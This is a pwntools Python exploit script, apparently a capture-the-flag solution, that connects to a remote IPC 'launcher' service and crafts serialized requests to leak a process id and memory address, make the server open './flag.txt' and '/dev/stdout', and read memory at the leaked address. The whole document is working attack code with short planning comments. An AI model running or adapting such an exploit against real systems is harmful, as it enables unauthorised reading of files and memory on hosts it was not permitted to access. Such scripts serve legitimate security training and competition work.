from pwn import *

p = remote("15.164.205.212", 5555)
#p = process('./launcher')

p.recv()

def launch_demux(a1, a2, func, size, a3):
    pay = b''
    pay += p64(a1)
    pay += p64(a2)

    pay += p64(0x70000000 + func)
    pay += p64(size) # Size ( size - 0x20 )
    p.send(pay)

def use_service(buf):
    pay = b''
    pay += p64(0) * 3
    pay += p64(len(buf) + 0x20)
    p.send(pay)
    sleep(0.5)
    p.send(buf)

'''
IPC Client

0x000 : Use Service
0x100 : Init Service ( Size Only 0x28 )
0x101 : Create Worker Thread
0x102 : Set New Buffer ( Size only 0x28 )
0x103 : Worker Thread Cancel ( Size only 0xA0 )

'''

launch_demux(0, 0, 0x100, 0x28, 0)
p.send(b"ABCDQWER")
'''
Exploit Plan

Server -> request id 0x4003
pid, target
target[2] = buf
target[3] = size
## open(target[2])

Client -> Server
->  call read write By fd
## read(fd, buf);
## write(4, buf); // client fd

## Client
## Read(3, buf);
## write(1, buf);
'''

def make_payload(val, _type):
    pay = b''
    pay += p32(0xf000)
    pay += p32(len(val))
    j = 0

    for i in val.keys():
        if _type[j] == 0x4000:
            pay += p32(len(i))
            pay += i.encode()
            pay += p32(_type[j])
            pay += val[i]

        else:
            pay += p32(len(i))
            pay += i.encode()
            pay += p32(_type[j])

            pay += p64(len(val[i]))
            pay += val[i]
        j += 1
    return pay


launch_demux(0, 0, 0x101, 0x28, 0)
p.send(b"ZXCVZXCV") # m priority / m Qos


p.recvuntil("tid : ")
tid = int(p.recvline())

req = p64(0x4001)
dump = p64(1)
b = {'request':req, "dump-all":dump}
pay = make_payload(b, [0x4000, 0x4000])
use_service(pay)

leak = u64(p.recvuntil("\x7f")[-6:].ljust(8, b'\x00')) + 0x2c0 + 0x5aa700 + 0x5000
log.info(hex(leak))
p.recv(2)

pid = u32(p.recv(4)) - 1
log.info(str(pid))


req = p64(0x4000)
queue = p64(0x5002)

# 0x80
server_req = p64(0x4003)

#qwer = {"request":server_req, "pid":p64(pid), "target":b"/home/ctf/flag.txt"}
qwer = {"request":server_req, "pid":p64(pid), "target":b"./flag.txt"}
qwer_pay = make_payload(qwer, [0x4000, 0x4000, 0x8000])

mig = b''
mig += p64(0) * 2
mig += p64(0x6001)
mig += p64(len(qwer_pay) + 0x20)
mig += qwer_pay

a = {"request":req, "queue-function":queue, "mig-request":mig}
pay = make_payload(a, [0x4000, 0x4000, 0x8000])
use_service(pay)

req = p64(0x4002)
start = p64(1)
c = {"request":req, "start":start}
pay = make_payload(c, [0x4000, 0x4000])

use_service(pay)

##############################################

req = p64(0x4000)
queue = p64(0x5002)

mig = b''
mig += p64(0) * 2
mig += p64(0x6002)
mig += p64(0x20 + 0x20)

mig += p64(0x70001)
mig += p64(5)
mig += p64(0xdeadbeefcafebabe)
mig += p64(0x100)

a = {"request":req, "queue-function":queue, "mig-request":mig}
pay = make_payload(a, [0x4000, 0x4000, 0x8000])
use_service(pay)

req = p64(0x4002)
start = p64(1)

c = {"request":req, "start":start}
pay = make_payload(c, [0x4000, 0x4000])
use_service(pay)

################################################


req = p64(0x4000)
queue = p64(0x5002)

# 0x80
server_req = p64(0x4003)

#qwer = {"request":server_req, "pid":p64(pid), "target":b"/home/ctf/flag.txt"}
qwer = {"request":server_req, "pid":p64(pid), "target":b"/dev/stdout"}
qwer_pay = make_payload(qwer, [0x4000, 0x4000, 0x8000])

mig = b''
mig += p64(0) * 2
mig += p64(0x6001)
mig += p64(len(qwer_pay) + 0x20)
mig += qwer_pay

a = {"request":req, "queue-function":queue, "mig-request":mig}
pay = make_payload(a, [0x4000, 0x4000, 0x8000])
use_service(pay)

req = p64(0x4002)
start = p64(1)
c = {"request":req, "start":start}
pay = make_payload(c, [0x4000, 0x4000])

use_service(pay)

################################################

req = p64(0x4000)
queue = p64(0x5002)

# 0x80
server_req = p64(0x4004)

qwer = {"request":server_req, "address":p64(leak), "channel":p64(4), "length":p64(0x100)}
qwer_pay = make_payload(qwer, [0x4000, 0x4000, 0x4000, 0x4000])

mig = b''
mig += p64(0) * 2
mig += p64(0x6001)
mig += p64(len(qwer_pay) + 0x20)
mig += qwer_pay

a = {"request":req, "queue-function":queue, "mig-request":mig}
pay = make_payload(a, [0x4000, 0x4000, 0x8000])
use_service(pay)

req = p64(0x4002)
start = p64(1)
c = {"request":req, "start":start}
pay = make_payload(c, [0x4000, 0x4000])

use_service(pay)

c = {"request":req, "start":start}
pay = make_payload(c, [0x4000, 0x4000])
use_service(pay)

################################################

req = p64(0x4000)
queue = p64(0x5001)

a = {"request":req, "queue-function":queue, "channel":p64(3), "recvsize":p64(0x100)}
pay = make_payload(a, [0x4000, 0x4000, 0x4000, 0x4000])
use_service(pay)

print(p.recv(0x1000))
p.interactive()
